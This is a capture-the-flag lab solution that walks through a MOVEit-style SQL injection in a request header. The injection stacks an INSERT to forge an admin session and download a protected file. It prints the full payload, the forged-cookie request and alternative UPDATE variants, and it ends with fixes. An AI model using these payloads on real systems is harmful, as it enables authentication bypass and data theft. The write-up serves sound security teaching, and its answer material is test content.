# Solution — sqli-moveit-header-auth-bypass-chain

> **OWASP:** A03:2021-Injection + A07:2021-Identification and Authentication
> Failures · **CWE:** CWE-89 (SQLi) → CWE-384 (session forgery) · **CVE analog:**
> CVE-2023-34362 (MOVEit Transfer) — abstracted; only the chain shape is reused.

## What tipped you off

`POST /api/transfer/register` accepts an `X-siLock-Comment` header. A single quote
in it breaks the audit insert (`{"ok": false, "error": "..."}`), so the header
reaches SQL. Meanwhile `GET /files/download?path=confidential/flag.bin` returns
`403` without a session, and `/login` is a dead end (no credentials). The two
facts combine: if the header injection can run a **second** statement, it can
create the session `/login` won't give you.

## The class of bug

SQL injection (CWE-89) into a **database-backed session store**, yielding
authentication bypass (CWE-384). `src/app.py`:

```python
comment = request.headers.get("X-siLock-Comment", "")
sql = ("INSERT INTO audit_log (comment, client_ip, created_at) "
       "VALUES ('" + comment + "', '" + client_ip + "', now())")
cur.execute(sql)     # psycopg2 .execute() runs multiple ';' statements
```

psycopg2's `.execute()` passes the whole string to `PQexec`, which runs every
`;`-separated statement — so a stacked `INSERT` executes alongside the audit
insert. (The session _lookup_ in `/files/download` and the `/login` check are both
correctly parameterised; the store is attacked through the audit sink, not read
through them.)

## Building the exploit

**Step 1 — forge an admin session.** The injected header must close the first
`INSERT` validly (it has three columns) and then stack the session insert:

```
X-siLock-Comment: x', '0.0.0.0', now()); INSERT INTO sessions
  (token, username, is_admin, expires)
  VALUES ('FORGED123', 'sysadmin', true, now() + interval '1 hour'); --
```

which assembles to (the trailing `', '<ip>', now())` is commented out by `--`):

```sql
INSERT INTO audit_log (comment, client_ip, created_at)
  VALUES ('x', '0.0.0.0', now());
INSERT INTO sessions (token, username, is_admin, expires)
  VALUES ('FORGED123', 'sysadmin', true, now() + interval '1 hour'); --', '...', now())
```

You chose the token, so you now hold a valid admin session.

**Step 2 — download with the forged cookie.**

```
GET /files/download?path=confidential/flag.bin
Cookie: moveit_session=FORGED123
```

**Step 3 — prove it.** SHA-256 the bytes and `POST /solve {"sha256":"<hex>"}` →
`FLAG{...}`.

`tests/exploit.py` performs the whole chain (stdlib only) in a fraction of a
second, and first confirms the download is `403` _before_ forging, so the
auth-bypass is real.

## Why forging beats reading

Classic SQLi reads secrets out of the database. Here the secret (the confidential
file) is not in the database at all — it lives on the app's filesystem behind an
authorization check. So instead of _reading_ data, you **write** state: a single
forged `sessions` row turns the injection into a valid identity. Attacking the
session store, not just query results, is the lesson.

## Lab-vs-production deviations

- **Stack abstracted to Linux.** The catalogue specified ASP.NET + MSSQL 2022 +
  nginx. MSSQL Server needs ~2 GB RAM and a ~1.5 GB image, which blows the
  platform's `mem_limit: 512m` / `<300 MB` gates, so the lab is re-platformed onto
  the project's Flask + PostgreSQL stack. The taught primitive — a header
  concatenated into a stacked `INSERT` that forges a session row — is identical;
  Postgres's psycopg2 `.execute()` stacks statements just as MSSQL's `SqlCommand`
  does. nginx (a transport detail) is omitted.
- **Per-container confidential file.** `flag.bin` is 4 KiB derived from
  `LAB_USER_SECRET`, so its SHA-256 is unique to your instance and a hash lifted
  from another learner will not validate. It never contains the flag itself; the
  flag is returned by `/solve` on a correct hash.
- **`/login` is a stub.** A real staff login would complete an SSO handshake; here
  it only proves you cannot get an admin session the legitimate way, which is why
  forging one is the intended path.

## Alternative payload vectors

1. **UPDATE instead of INSERT**: if a session row already exists,
   `; UPDATE sessions SET is_admin=true WHERE token='<yours>'` escalates it.
2. **Longer expiry / different user**: forge `username='sysadmin'` (used here) or
   any privileged account the app trusts; set `expires` far in the future.
3. **Second-order**: stack the forge into any endpoint that concatenates input
   into an `.execute()` call, not only the audit header.

## Fix

- **Parameterise the audit insert** (`cur.execute(sql, (comment, client_ip))`);
  bound parameters cannot introduce a second statement.
- **Do not run multi-statement strings** from request-derived SQL; disable stacked
  queries at the data layer where possible.
- **Sign sessions** (or store a server-side secret alongside the token) so a row
  an attacker can write is not, by itself, a usable identity.
